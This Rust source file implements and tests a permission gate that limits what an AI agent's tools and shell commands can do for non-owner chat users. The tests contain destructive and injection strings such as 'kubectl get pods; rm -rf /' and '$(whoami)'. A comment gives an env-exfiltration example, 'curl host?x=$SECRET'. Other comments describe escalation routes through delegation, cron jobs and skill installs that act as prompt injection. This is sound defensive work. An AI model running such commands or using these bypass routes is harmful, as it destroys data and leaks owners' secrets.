//! Per-role capability ceiling for **normal users** (non-owners) on multi-user
//! channels.
//!
//! Owners (senders in `channels_config.approval_owners`) get the full toolset.
//! Everyone else who is allowed to chat is a *guest*, and their turns run under
//! a [`GuestGate`]: a tool the agent calls on a guest's behalf must be
//! permitted, and if it's `shell`, the command must match one of the guest
//! command globs. Anything else is denied outright (a hard ceiling — never
//! escalated to an owner).
//!
//! Built per turn at the channel/gateway entry from config; `None` means "no
//! restriction" (owner, CLI, or console-authenticated user).

use std::collections::HashSet;
use std::path::Path;

tokio::task_local! {
    /// Set by channel dispatch around a non-owner's tool loop, and nowhere else.
    ///
    /// A `Tool` carries no sender, so the file tools cannot ask who the turn is
    /// for. The memory view does not say either: a guest, an owner in a group
    /// and a job created from a chat all run under `MemoryView::Only`. The rule
    /// that stops a write to the owner's private files and prompt files keys on
    /// this marker, so only a guest loses that access.
    pub static GUEST_TURN: ();
}

/// True when the current task runs a guest's turn. See [`GUEST_TURN`].
#[must_use]
pub fn current_turn_is_guest() -> bool {
    GUEST_TURN.try_with(|()| ()).is_ok()
}

/// The capability ceiling applied to a single non-owner ("guest") turn.
#[derive(Debug, Clone)]
pub struct GuestGate {
    /// Tools a guest may use: exactly `channels_config.guest_allowed_tools`.
    /// The owner's `autonomy.auto_approve` list is **not** unioned in.
    permitted_tools: HashSet<String>,
    /// Shell-command glob patterns a guest may run (`channels_config.guest_allowed_commands`).
    allowed_commands: Vec<String>,
}

impl GuestGate {
    /// Build a gate from the operator-configured guest allowances only.
    ///
    /// `guest_tools` is the exact permitted set: the agent will call **only**
    /// these tools on a guest's behalf. The owner's `autonomy.auto_approve`
    /// list is intentionally **not** unioned in: that list governs the owner's
    /// own approval flow, not what a guest may use. An operator who wants a
    /// guest to be able to read files or recall memory must list those tools
    /// in `channels_config.guest_allowed_tools`. Empty `guest_tools` (the
    /// default) means the agent calls no tool on a guest's behalf; the guest
    /// can still chat.
    pub fn new(guest_tools: &[String], guest_commands: &[String]) -> Self {
        Self {
            permitted_tools: guest_tools.iter().cloned().collect(),
            allowed_commands: guest_commands.to_vec(),
        }
    }

    /// Tools that are **owner-only**, no matter what `guest_allowed_tools`
    /// says — even if an owner adds one by mistake. Checked before the allowlist.
    /// Three reasons a tool lands here:
    ///   * it mutates authority itself (`manage_permissions` — who owns the bot;
    ///     `issue_pairing_code` — mints a code that can promote its recipient to
    ///     owner, so a guest minting one would be an authority escalation);
    ///   * it executes code outside this gate's reach, so the guest ceiling
    ///     can't constrain it:
    ///       - `delegate` spawns a sub-agent loop with NO guest gate, so any tool
    ///         the sub-agent is allowed runs unconstrained — a full bypass;
    ///       - `ssh` / `pty` run arbitrary commands on a remote host / live tmux
    ///         session and don't carry a glob-checkable single command;
    ///       - `cron_add` / `cron_update` persist an **agent** job whose later
    ///         scheduled run calls `crate::agent::run(...)` with the full toolset
    ///         and NO guest gate — the same deferred sub-loop bypass as
    ///         `delegate`, just fired later; `cron_run` triggers that run
    ///         immediately. Read-only `cron_list` / `cron_runs` stay allowed;
    ///   * it injects instructions into the system prompt for every later turn,
    ///     which this per-turn gate can't later constrain:
    ///       - `author_skill` / `skills_install` write a new skill (local
    ///         authoring or an arbitrary ClawHub download) that the agent picks
    ///         up on the next turn — a persistent prompt-injection primitive;
    ///       - `skills_install_deps` shells out to a package manager
    ///         (brew/uv/npm/go) on the skill's behalf.
    pub const OWNER_ONLY_TOOLS: &'static [&'static str] = &[
        "manage_permissions",
        "issue_pairing_code",
        "delegate",
        "ssh",
        "pty",
        // Persists proxy config and can rewrite the whole process's egress
        // (HTTP(S)_PROXY) — same config-mutating/traffic-redirecting class as
        // the tools above, so a guest must never reach it.
        "proxy_config",
        "author_skill",
        "skills_install",
        "skills_install_deps",
        "cron_add",
        "cron_update",
        "cron_run",
        // Deleting a scheduled job is a mutation a guest must not perform (job
        // tampering / denial of the owner's schedule) — read-only cron_list /
        // cron_runs stay allowed.
        "cron_remove",
        // The `screenshot` action passes a model-chosen `path` straight to the
        // browser CLI (`src/tools/browser.rs:490-498`, `:1054-1055`), with no
        // workspace bound, so a guest granted `browser` could overwrite
        // `config.toml`, `MEMORY.md` or `memory/brain.db`. The tool is also
        // free to navigate to any URL and submit credentials / execute
        // commands on the owner's behalf. `docs/security/per-role-permissions.md`
        // already tells operators not to grant it; the gate adds the hard
        // deny so an operator who listed it in `guest_allowed_tools` loses it.
        "browser",
        // Read-only transcript lookup. The tool itself is already scoped to
        // the current memory view (no-view refuses), but a guest never has a
        // view in the first place — so the gate blocks it before the view
        // check. Letting a guest reach the transcripts of an owner's DMs is
        // the leak we are closing; the gate is the only thing that stops an
        // operator who listed it in `guest_allowed_tools` from giving them
        // that access.
        "session_search",
    ];

    /// Whether a guest may invoke `tool` at all. Owner-only tools are always
    /// denied; otherwise the tool must be in the permitted set.
    pub fn tool_permitted(&self, tool: &str) -> bool {
        if Self::OWNER_ONLY_TOOLS.contains(&tool) {
            return false;
        }
        self.permitted_tools.contains(tool)
    }

    /// Whether a guest may run shell `command`. Conservative: the command must
    /// be a single simple command (no chaining/pipe/redirect/subshell — those
    /// could smuggle a non-allowlisted command past the glob) AND match one of
    /// the configured globs.
    pub fn command_permitted(&self, command: &str) -> bool {
        let cmd = command.trim();
        if cmd.is_empty() {
            return false;
        }
        // Reject any shell metacharacter that could chain, redirect, or inject a
        // second command — a guest only runs one plain command. Commands run via
        // `sh -c`, so ANY `$` is rejected: it covers command substitution `$(…)`,
        // parameter expansion `${…}`/`$VAR` (env exfiltration, e.g.
        // `curl host?x=$SECRET`), and ANSI-C quoting `$'\n…'` (smuggles control
        // bytes / separators on shells where /bin/sh is bash). Backticks and the
        // redirect/chain/subshell operators are blocked alongside.
        const FORBIDDEN: &[&str] = &[
            "`", "$", "<(", ">(", "&&", "||", ";", "|", ">", "<", "&", "\n", "\r", "\t",
        ];
        if FORBIDDEN.iter().any(|m| cmd.contains(m)) {
            return false;
        }
        self.allowed_commands.iter().any(|p| glob_match(p, cmd))
    }

    /// Decision for a single tool call. `arguments` is the parsed call args
    /// (used to extract the shell command). Returns `None` if permitted, or
    /// `Some(reason)` to deny with that message.
    pub fn deny_reason(&self, tool: &str, arguments: &serde_json::Value) -> Option<String> {
        if Self::OWNER_ONLY_TOOLS.contains(&tool) {
            return Some(format!(
                "The `{tool}` tool is owner-only and cannot be used by non-owner users \
                 (it changes who owns the bot). An owner must do this. {}",
                Self::how_to_become_owner_sentence()
            ));
        }
        if !self.tool_permitted(tool) {
            return Some(format!(
                "The `{tool}` tool isn't available to non-owner users on this channel. \
                 Ask an owner to run it, or to add it to the guest allowlist. {}",
                Self::how_to_become_owner_sentence()
            ));
        }
        // Shell is permitted as a tool — now gate the specific command.
        if is_shell_tool(tool) {
            let command = arguments
                .get("command")
                .and_then(serde_json::Value::as_str)
                .unwrap_or("")
                .to_string();
            if !self.command_permitted(&command) {
                return Some(format!(
                    "As a non-owner you can only run commands an owner has allowlisted for guests \
                     (and only simple, single commands). `{}` isn't permitted. {}",
                    command.trim(),
                    Self::how_to_become_owner_sentence()
                ));
            }
        }
        // Path-bearing tools (file_read, file_write, pdf_read, image_info)
        // may still try to reach `MEMORY.md`, `USER.md`, `BOOTSTRAP.md`,
        // `MEMORY_SNAPSHOT.md`, `TOOLS.md`, or anything under `memory/` even when they are
        // in `guest_allowed_tools`. The owner's profile and notes are private
        // to the owner; deny with the same single sentence regardless of which
        // tool tried. Operates even when the operator listed the tool for
        // guests — that listing is the capability grant, not a privacy
        // override. Writes to the owner's prompt files and `skills/` are
        // refused later, on the resolved path, inside `file_write`.
        if is_path_tool(tool) {
            let path = arguments
                .get("path")
                .and_then(serde_json::Value::as_str)
                .unwrap_or("");
            if is_private_owner_path(path) {
                return Some(format!(
                    "This file is private to the owner. {}",
                    Self::how_to_become_owner_sentence()
                ));
            }
        }
        None
    }

    /// One-line trailing sentence every guest denial carries: the real path to
    /// becoming an owner, instead of the misleading "ask an owner to add you to
    /// the allowlist" wording some denials used to give. The channel name is
    /// not in scope here, so it is left as the literal placeholder the operator
    /// reads as "the channel they are chatting on".
    fn how_to_become_owner_sentence() -> &'static str {
        "To become an owner, ask a current owner to run \
         `rantaiclaw channels pair --channel <channel>` on the host, \
         then `/claim <code>` in this chat."
    }
}

/// Tools whose calls carry a shell `command` argument to gate.
fn is_shell_tool(tool: &str) -> bool {
    matches!(tool, "shell" | "bash" | "run_command")
}

/// Tools whose calls reach the workspace on a path argument. This keeps
/// a guest from reaching the owner's private files (`USER.md`, `MEMORY.md`,
/// `BOOTSTRAP.md`, `MEMORY_SNAPSHOT.md`, `TOOLS.md` and `memory/`) directly even
/// when the operator lists one of these tools in `guest_allowed_tools`. The
/// dispatch skips those files in the system prompt's identity section, so a
/// guest should never see that content in the prompt either — these extra
/// checks stop a guest's tool call from reopening the path through
/// `file_read`.
fn is_path_tool(tool: &str) -> bool {
    matches!(tool, "file_read" | "file_write" | "pdf_read" | "image_info")
}

/// Last path component (case-insensitive). `MEMORY.md`, `USER.md`,
/// `BOOTSTRAP.md`, `MEMORY_SNAPSHOT.md`, `TOOLS.md`, and `user.md` all match;
/// `./MEMORY.md`, `memory/brain.db`, and `<workspace>/memory/2026-09-01.md`
/// all match by their `memory` component.
pub(crate) fn is_private_owner_path(path: &str) -> bool {
    if path.trim().is_empty() {
        return false;
    }
    let normalized = path.replace('\\', "/");
    let lowered = normalized.to_ascii_lowercase();
    // Last component is `MEMORY.md`, `USER.md`, `BOOTSTRAP.md`,
    // `MEMORY_SNAPSHOT.md`, or `TOOLS.md`, case-insensitive. ".//USER.md" and
    // "/foo/USER.md" both have `USER.md` as their last segment.
    let last = lowered.rsplit('/').next().unwrap_or("");
    if matches!(
        last,
        "memory.md" | "user.md" | "bootstrap.md" | "memory_snapshot.md" | "tools.md"
    ) {
        return true;
    }
    // Any `memory` path component catches the day's `memory/brain.db`,
    // `memory/2026-09-01.md`, etc. The owner keeps those; a guest does not.
    lowered.split('/').any(|seg| seg == "memory")
}

/// True when a **canonicalised** path must be denied under a guest's
/// conversation-scoped memory view (`MemoryView::Only`).
///
/// [`is_private_owner_path`] runs on the string the model asked for, before a
/// file tool resolves it — a symlink, an editor backup name (`USER.md~`), or
/// the snapshot file's real path can slip past that string rule while still
/// pointing at the same private content. This is the second check, run after
/// canonicalisation, so those bypasses are still caught.
///
/// `canonical_workspace` must itself be canonicalised (a temp-dir workspace
/// is often reached through a symlink), or `strip_prefix` fails and the
/// `memory/` directory rule is quietly skipped. The file-name rule does not
/// depend on the workspace and still applies.
pub fn is_private_owner_path_resolved(resolved: &Path, canonical_workspace: &Path) -> bool {
    if let Ok(rel) = resolved.strip_prefix(canonical_workspace) {
        if rel
            .components()
            .next()
            .is_some_and(|c| c.as_os_str() == "memory")
        {
            return true;
        }
    }

    let Some(name) = resolved.file_name().and_then(|n| n.to_str()) else {
        return false;
    };
    let lowered = name.to_ascii_lowercase();
    let stripped = lowered.strip_prefix('.').unwrap_or(&lowered);
    const PRIVATE_STEMS: &[&str] = &[
        "memory.md",
        "user.md",
        "bootstrap.md",
        "memory_snapshot.md",
        "tools.md",
    ];
    PRIVATE_STEMS.iter().any(|stem| stripped.starts_with(stem))
}

/// Workspace-root files the system prompt injects into the owner's turns.
const OWNER_PROMPT_FILES: &[&str] = &[
    "AGENTS.md",
    "SOUL.md",
    "TOOLS.md",
    "IDENTITY.md",
    "HEARTBEAT.md",
];

/// True when a **canonicalised** path is one whose content later reaches the
/// owner's prompt, so a guest's turn must not **write** it: anything under
/// `<workspace>/skills/` (skills load into owner prompts by default) and the
/// prompt files at the workspace root (`AGENTS.md`, `SOUL.md`, `TOOLS.md`,
/// `IDENTITY.md`, `HEARTBEAT.md`).
///
/// This is a write-only rule. Reading these files stays allowed, unlike the
/// files [`is_private_owner_path_resolved`] hides. `author_skill` is owner-only
/// for the same reason; this closes the file path to the same place.
///
/// Names compare case-insensitively so a case-insensitive filesystem cannot
/// reach `agents.md` through the same file, and without trailing dots and spaces
/// or a `:stream` suffix, which Windows ignores. The rule compares the path, not
/// the file: a second hard link to a prompt file under another name is not
/// recognised.
///
/// `canonical_workspace` must be canonicalised, as for
/// [`is_private_owner_path_resolved`]. A path outside it is not judged here: the
/// workspace containment check refuses it.
pub fn is_owner_prompt_path_resolved(resolved: &Path, canonical_workspace: &Path) -> bool {
    let Ok(rel) = resolved.strip_prefix(canonical_workspace) else {
        return false;
    };
    let mut parts = rel.components();
    let Some(first) = parts.next().and_then(|c| c.as_os_str().to_str()) else {
        return false;
    };
    // Windows drops trailing dots and spaces from a name and reads `name:stream`
    // as a stream of `name`, so `AGENTS.md.` and `AGENTS.md:x` are the prompt
    // file there. They compare as the file.
    let first = first.split(':').next().unwrap_or(first);
    let first = first.trim_end_matches(['.', ' ']);
    if first.eq_ignore_ascii_case("skills") {
        return true;
    }
    parts.next().is_none()
        && OWNER_PROMPT_FILES
            .iter()
            .any(|name| first.eq_ignore_ascii_case(name))
}

/// Anchored glob match supporting `*` (matches any run of characters, incl.
/// empty). Case-sensitive. `"kubectl get *"` matches `"kubectl get pods -n x"`.
fn glob_match(pattern: &str, text: &str) -> bool {
    fn helper(p: &[u8], t: &[u8]) -> bool {
        match p.first() {
            None => t.is_empty(),
            Some(&b'*') => helper(&p[1..], t) || (!t.is_empty() && helper(p, &t[1..])),
            Some(&c) => !t.is_empty() && t[0] == c && helper(&p[1..], &t[1..]),
        }
    }
    helper(pattern.as_bytes(), text.as_bytes())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn gate() -> GuestGate {
        GuestGate::new(
            &["shell".to_string(), "web_search".to_string()],
            &[
                "kubectl get *".to_string(),
                "kubectl describe *".to_string(),
                "ls".to_string(),
            ],
        )
    }

    #[test]
    fn glob_matches_anchored_with_star() {
        assert!(glob_match("kubectl get *", "kubectl get pods"));
        assert!(glob_match(
            "kubectl get *",
            "kubectl get pods -n kube-system"
        ));
        assert!(glob_match("ls", "ls"));
        assert!(!glob_match("kubectl get *", "kubectl delete pods"));
        assert!(!glob_match("ls", "ls -la")); // anchored — no trailing wildcard
        assert!(!glob_match("kubectl get *", "xkubectl get pods")); // anchored start
    }

    #[test]
    fn safe_and_allowed_tools_permitted_others_denied() {
        // The operator lists exactly `shell` and `web_search` for guests. The
        // always-safe `file_read` and `memory_recall` (in the owner's
        // `autonomy.auto_approve` list) must NOT be unioned in: a guest must
        // only get what `guest_allowed_tools` lists.
        let g = gate();
        assert!(g.tool_permitted("web_search")); // explicit guest tool
        assert!(g.tool_permitted("shell")); // explicit guest tool
                                            // The always-safe tools are NOT in `guest_allowed_tools` and must stay
                                            // denied for guests — this is the whole point of the guest ceiling.
        assert!(!g.tool_permitted("file_read"));
        assert!(!g.tool_permitted("memory_recall"));
        assert!(!g.tool_permitted("file_write")); // not allowed
        assert!(!g.tool_permitted("ssh"));
    }

    #[test]
    fn shell_command_ceiling() {
        let g = gate();
        assert!(g.command_permitted("kubectl get pods"));
        assert!(g.command_permitted("kubectl describe pod x"));
        assert!(g.command_permitted("ls"));
        // off-list verb
        assert!(!g.command_permitted("kubectl delete pod x"));
        // injection / chaining blocked even though prefix matches
        assert!(!g.command_permitted("kubectl get pods; rm -rf /"));
        assert!(!g.command_permitted("kubectl get pods && rm -rf /"));
        assert!(!g.command_permitted("kubectl get pods | tee /etc/x"));
        assert!(!g.command_permitted("kubectl get pods > /etc/x"));
        assert!(!g.command_permitted("kubectl get $(whoami)"));
        // any `$` is rejected: command sub, param expansion (env exfil), ANSI-C
        assert!(!g.command_permitted("kubectl get ${IFS}pods"));
        assert!(!g.command_permitted("kubectl get $HOME"));
        assert!(!g.command_permitted("kubectl get $'\\n'pods")); // literal $'\n' in the command string
                                                                 // tab as a separator is rejected
        assert!(!g.command_permitted("kubectl get\tpods"));
        assert!(!g.command_permitted(""));
    }

    #[test]
    fn owner_only_tools_never_permitted_for_guests() {
        // Even if an owner mistakenly adds `manage_permissions` to the guest
        // allowlist, the hard owner-only denylist still blocks it.
        let g = GuestGate::new(
            &[
                "manage_permissions".to_string(),
                "issue_pairing_code".to_string(),
                "delegate".to_string(),
                "ssh".to_string(),
                "pty".to_string(),
                "proxy_config".to_string(),
                "session_search".to_string(),
            ],
            &[],
        );
        for tool in [
            "manage_permissions",
            "issue_pairing_code",
            "delegate",
            "ssh",
            "pty",
            "proxy_config",
            "session_search",
        ] {
            assert!(!g.tool_permitted(tool), "{tool} must stay owner-only");
            let reason = g.deny_reason(tool, &json!({})).unwrap();
            assert!(reason.contains("owner-only"), "{tool}: {reason}");
            assert!(
                reason.contains("channels pair"),
                "{tool}: not told how to become an owner: {reason}"
            );
            assert!(
                reason.contains("/claim"),
                "{tool}: not told how to become an owner: {reason}"
            );
        }
    }

    #[test]
    fn guest_denied_skill_write_tools_even_when_allowlisted() {
        // Owner explicitly (mis)configured these into guest_allowed_tools.
        let g = GuestGate::new(
            &[
                "skills_install".to_string(),
                "author_skill".to_string(),
                "skills_install_deps".to_string(),
            ],
            &[],
        );
        assert!(!g.tool_permitted("skills_install"));
        assert!(!g.tool_permitted("author_skill"));
        assert!(!g.tool_permitted("skills_install_deps"));
        for tool in ["skills_install", "author_skill", "skills_install_deps"] {
            let reason = g.deny_reason(tool, &json!({})).unwrap();
            assert!(reason.contains("owner-only"), "{tool}: {reason}");
            assert!(
                reason.contains("channels pair"),
                "{tool}: not told how to become an owner: {reason}"
            );
            assert!(
                reason.contains("/claim"),
                "{tool}: not told how to become an owner: {reason}"
            );
        }
    }

    #[test]
    fn guest_denied_cron_mutation_tools_but_allowed_read_only() {
        // Owner (mis)configured all five cron tools into guest_allowed_tools.
        let g = GuestGate::new(
            &[
                "cron_add".to_string(),
                "cron_update".to_string(),
                "cron_run".to_string(),
                "cron_remove".to_string(),
                "cron_list".to_string(),
                "cron_runs".to_string(),
            ],
            &[],
        );
        // The mutation/trigger tools stay owner-only even when allowlisted:
        // each persists, fires, or deletes an agent job the guest ceiling can't
        // constrain.
        for tool in ["cron_add", "cron_update", "cron_run", "cron_remove"] {
            assert!(!g.tool_permitted(tool), "{tool} must stay owner-only");
            let reason = g.deny_reason(tool, &json!({})).unwrap();
            assert!(reason.contains("owner-only"), "{tool}: {reason}");
            assert!(
                reason.contains("channels pair"),
                "{tool}: not told how to become an owner: {reason}"
            );
            assert!(
                reason.contains("/claim"),
                "{tool}: not told how to become an owner: {reason}"
            );
        }
        // Read-only cron tools must remain usable by guests when allowlisted.
        assert!(g.tool_permitted("cron_list"));
        assert!(g.tool_permitted("cron_runs"));
    }

    /// `browser`'s `screenshot` action passes a model-chosen `path` straight to
    /// the browser CLI (`src/tools/browser.rs:490-498`, `:1054-1055`), with no
    /// workspace bound, so a guest granted `browser` could overwrite
    /// `config.toml`, `MEMORY.md` or `memory/brain.db` from outside the
    /// workspace. `docs/security/per-role-permissions.md` already tells
    /// operators not to grant it; the gate adds the hard deny, so an operator
    /// who listed it in `guest_allowed_tools` loses it.
    #[test]
    fn guest_denied_browser_even_when_allowlisted() {
        let g = GuestGate::new(&["browser".to_string()], &[]);
        assert!(
            !g.tool_permitted("browser"),
            "browser must stay owner-only when an operator allowlists it"
        );
        let reason = g
            .deny_reason("browser", &json!({}))
            .expect("browser must be denied for a guest");
        assert!(reason.contains("owner-only"), "{reason}");
        assert!(
            reason.contains("channels pair"),
            "browser denial must name the owner-pair flow: {reason}"
        );
        assert!(
            reason.contains("/claim"),
            "browser denial must name /claim: {reason}"
        );
    }

    #[test]
    fn deny_reason_paths() {
        let g = gate();
        // disallowed tool — also assert the wording names the owner-pair flow,
        // so a regression that drops the helper from this arm (the only one of
        // the three that no other test exercises the wording of) is caught.
        let disallowed_reason = g
            .deny_reason("file_write", &json!({}))
            .expect("file_write is not in the gate and must be denied");
        assert!(
            disallowed_reason.contains("channels pair"),
            "tool-not-permitted arm must name the owner-pair flow: {disallowed_reason:?}"
        );
        assert!(
            disallowed_reason.contains("/claim"),
            "tool-not-permitted arm must name /claim: {disallowed_reason:?}"
        );
        // allowed explicit guest tool
        assert!(g.deny_reason("web_search", &json!({})).is_none());
        // shell allowed + command allowed
        assert!(g
            .deny_reason("shell", &json!({"command": "kubectl get pods"}))
            .is_none());
        // shell allowed + command denied
        assert!(g
            .deny_reason("shell", &json!({"command": "rm -rf /"}))
            .is_some());
    }

    #[test]
    fn deny_reason_shell_command_path_names_the_owner_pair_flow() {
        let g = GuestGate::new(&["shell".to_string()], &["ls".to_string()]);
        let reason = g
            .deny_reason("shell", &json!({"command": "rm -rf /"}))
            .expect("a non-allowlisted shell command must deny");
        assert!(
            reason.contains("owner"),
            "the shell denial must still mention owner wording; got: {reason:?}"
        );
        assert!(
            reason.contains("channels pair"),
            "the shell denial must name the owner-pair flow; got: {reason:?}"
        );
        assert!(
            reason.contains("/claim"),
            "the shell denial must name the /claim reply; got: {reason:?}"
        );
    }

    #[test]
    fn empty_guest_list_permits_nothing() {
        // The default install: `guest_allowed_tools = []`. The agent calls no
        // tool on a guest's behalf, including the always-safe `file_read` and
        // `memory_recall` the owner's `auto_approve` list carries.
        let g = GuestGate::new(&[], &[]);
        for tool in ["file_read", "memory_recall", "web_search", "shell"] {
            assert!(
                !g.tool_permitted(tool),
                "{tool} must be denied for a guest with an empty allowlist"
            );
        }
        let reason = g
            .deny_reason("file_read", &json!({}))
            .expect("file_read must be denied");
        assert!(
            reason.contains("isn't available to non-owner users"),
            "denial must use the non-owner-available wording: {reason:?}"
        );
        assert!(
            reason.contains("channels pair"),
            "denial must name the owner-pair flow: {reason:?}"
        );
        assert!(
            reason.contains("/claim"),
            "denial must name /claim: {reason:?}"
        );
    }

    // ────────────────────────────────────────────────────────────────
    // Private-path rule. The owner's profile (`USER.md`) and
    // notes (`MEMORY.md`) are owner-private even when the operator
    // adds the path tools to `guest_allowed_tools`. The dispatch also
    // skips those files in the guest prompt, so a guest should never
    // see the content; the rule here closes the bypass where the model
    // could `file_read` the same path directly.
    #[test]
    fn guest_path_tool_blocked_on_memory_md() {
        let g = GuestGate::new(
            &[
                "file_read".to_string(),
                "file_write".to_string(),
                "pdf_read".to_string(),
                "image_info".to_string(),
            ],
            &[],
        );
        for tool in ["file_read", "file_write", "pdf_read", "image_info"] {
            // Plain
            let r = g
                .deny_reason(tool, &json!({"path": "MEMORY.md"}))
                .unwrap_or_else(|| panic!("{tool} on MEMORY.md must deny"));
            assert!(r.contains("private to the owner"), "{tool}: {r}");
            assert!(r.contains("/claim"), "{tool}: {r}");
            // Case-insensitive on the filename
            let r2 = g
                .deny_reason(tool, &json!({"path": "memory.md"}))
                .unwrap_or_else(|| panic!("{tool} on memory.md must deny (case-insensitive)"));
            assert!(r2.contains("private to the owner"), "{tool}: {r2}");
            // User.md too
            let r3 = g
                .deny_reason(tool, &json!({"path": "USER.md"}))
                .unwrap_or_else(|| panic!("{tool} on USER.md must deny"));
            assert!(r3.contains("private to the owner"), "{tool}: {r3}");
            // Anything under `memory/`
            let r4 = g
                .deny_reason(tool, &json!({"path": "memory/2026-09-26.md"}))
                .unwrap_or_else(|| panic!("{tool} on memory/<file> must deny"));
            assert!(r4.contains("private to the owner"), "{tool}: {r4}");
            // Nested USER.md
            let r5 = g
                .deny_reason(tool, &json!({"path": "/var/lib/rantaiclaw/USER.md"}))
                .unwrap_or_else(|| panic!("{tool} on nested USER.md must deny"));
            assert!(r5.contains("private to the owner"), "{tool}: {r5}");
            // Backslash-normalized too
            let r6 = g
                .deny_reason(tool, &json!({"path": "memory\\2026-09-26.md"}))
                .unwrap_or_else(|| panic!("{tool} on backslash memory path must deny"));
            assert!(r6.contains("private to the owner"), "{tool}: {r6}");
        }
    }

    #[test]
    fn guest_path_tool_blocked_on_bootstrap_and_snapshot() {
        let g = GuestGate::new(&["file_read".to_string()], &[]);
        let r = g
            .deny_reason("file_read", &json!({"path": "BOOTSTRAP.md"}))
            .unwrap_or_else(|| panic!("file_read on BOOTSTRAP.md must deny"));
        assert!(r.contains("private to the owner"), "{r}");
        let r2 = g
            .deny_reason("file_read", &json!({"path": "MEMORY_SNAPSHOT.md"}))
            .unwrap_or_else(|| panic!("file_read on MEMORY_SNAPSHOT.md must deny"));
        assert!(r2.contains("private to the owner"), "{r2}");
    }

    /// `TOOLS.md` holds the owner's SSH hosts and device nicknames. The guest
    /// prompt leaves it out, so a guest must not read it through a tool either.
    #[test]
    fn guest_path_tool_blocked_on_tools_md() {
        let g = GuestGate::new(&["file_read".to_string()], &[]);
        for path in [
            "TOOLS.md",
            "tools.md",
            "./TOOLS.md",
            "/var/lib/rantaiclaw/TOOLS.md",
        ] {
            let r = g
                .deny_reason("file_read", &json!({ "path": path }))
                .unwrap_or_else(|| panic!("file_read on {path} must deny"));
            assert!(r.contains("private to the owner"), "{path}: {r}");
        }
    }

    #[test]
    fn guest_path_tool_allowed_on_non_private_paths() {
        let g = GuestGate::new(&["file_read".to_string()], &[]);
        // Plain files in the workspace stay readable when allowlisted.
        assert!(g
            .deny_reason("file_read", &json!({"path": "notes.txt"}))
            .is_none());
        // Directories named `something_memory` (not `memory`) are fine.
        assert!(g
            .deny_reason("file_read", &json!({"path": "memoryless/foo.md"}))
            .is_none());
        // Empty / missing path → no privacy verdict (gate sees no reason to deny).
        assert!(g.deny_reason("file_read", &json!({})).is_none());
        // Filename happens to contain `memory` but is not the special path.
        assert!(g
            .deny_reason("file_read", &json!({"path": "team_memory.md"}))
            .is_none());
    }

    // ────────────────────────────────────────────────────────────────
    // The post-canonicalisation check. `is_private_owner_path` matches the
    // string a caller asked for; this one matches the real, resolved path
    // a symlink or editor-backup name points at.
    #[test]
    fn resolved_path_denies_files_under_the_memory_dir() {
        let workspace = Path::new("/ws");
        assert!(is_private_owner_path_resolved(
            &workspace.join("memory/2026-09-26.md"),
            workspace
        ));
    }

    #[test]
    fn resolved_path_denies_private_stems_case_insensitively() {
        let workspace = Path::new("/ws");
        for name in ["USER.md", "memory.md", "BOOTSTRAP.md", "MEMORY_SNAPSHOT.md"] {
            assert!(
                is_private_owner_path_resolved(&workspace.join(name), workspace),
                "{name} must be denied"
            );
        }
    }

    #[test]
    fn resolved_path_denies_tools_md_and_its_backup_names() {
        let workspace = Path::new("/ws");
        for name in ["TOOLS.md", "tools.md", "TOOLS.md~", ".TOOLS.md.swp"] {
            assert!(
                is_private_owner_path_resolved(&workspace.join(name), workspace),
                "{name} must be denied"
            );
        }
    }

    #[test]
    fn resolved_path_denies_editor_backup_and_swap_names() {
        let workspace = Path::new("/ws");
        for name in ["USER.md~", ".USER.md.swp", "USER.md.bak"] {
            assert!(
                is_private_owner_path_resolved(&workspace.join(name), workspace),
                "{name} must be denied"
            );
        }
    }

    #[test]
    fn resolved_path_allows_ordinary_files() {
        let workspace = Path::new("/ws");
        assert!(!is_private_owner_path_resolved(
            &workspace.join("README.md"),
            workspace
        ));
        assert!(!is_private_owner_path_resolved(
            &workspace.join("notes.txt"),
            workspace
        ));
    }

    #[test]
    fn owner_prompt_rule_covers_skills_and_root_prompt_files() {
        let ws = Path::new("/ws");
        for rel in [
            "skills/x/SKILL.md",
            "skills/x/tools/run.sh",
            "Skills/x/SKILL.md",
            "skills",
            "AGENTS.md",
            "SOUL.md",
            "TOOLS.md",
            "IDENTITY.md",
            "HEARTBEAT.md",
            "agents.md",
        ] {
            assert!(
                is_owner_prompt_path_resolved(&ws.join(rel), ws),
                "{rel} must be a guest-unwritable prompt path"
            );
        }
    }

    /// Windows drops trailing dots and spaces from a name and reads
    /// `name:stream` as a stream of the file, so each of these is the prompt file
    /// there, whether or not the file exists yet.
    #[test]
    fn owner_prompt_rule_reads_windows_name_forms_as_the_file() {
        let ws = Path::new("/ws");
        for rel in [
            "AGENTS.md.",
            "AGENTS.md ",
            "AGENTS.md:stream",
            "agents.md:stream",
            "skills.",
            "skills:stream/x.md",
        ] {
            assert!(
                is_owner_prompt_path_resolved(&ws.join(rel), ws),
                "{rel} must be a guest-unwritable prompt path"
            );
        }
    }

    #[test]
    fn owner_prompt_rule_leaves_other_paths_alone() {
        let ws = Path::new("/ws");
        for rel in [
            "notes/a.txt",
            "README.md",
            "docs/AGENTS.md",
            "notes/skills/x.md",
            "skills_backup/x.md",
            "AGENTS.md.txt",
        ] {
            assert!(
                !is_owner_prompt_path_resolved(&ws.join(rel), ws),
                "{rel} must stay writable"
            );
        }
        // Outside the workspace: containment refuses it, not this rule.
        assert!(!is_owner_prompt_path_resolved(
            Path::new("/elsewhere/AGENTS.md"),
            ws
        ));
    }

    #[test]
    fn guest_path_rule_applies_to_non_path_tools_too() {
        // The path rule is keyed on `path_tools` (file_read, file_write,
        // pdf_read, image_info). A tool that takes a non-path argument
        // (e.g. `shell`) must keep its existing semantics — the rule does
        // not silently widen to other tools.
        let g = GuestGate::new(&["shell".to_string()], &["*".to_string()]);
        // The wildcard command lets the shell ceiling pass, so the test can
        // prove the path rule does not fire on shell. shell allowed + a
        // private-path argument → governed by the shell arm, not the path arm.
        // No path because the rule doesn't fire on shell and "MEMORY.md" isn't
        // a command the gate parses.
        assert!(g
            .deny_reason("shell", &json!({"command": "MEMORY.md"}))
            .is_none());
    }
}
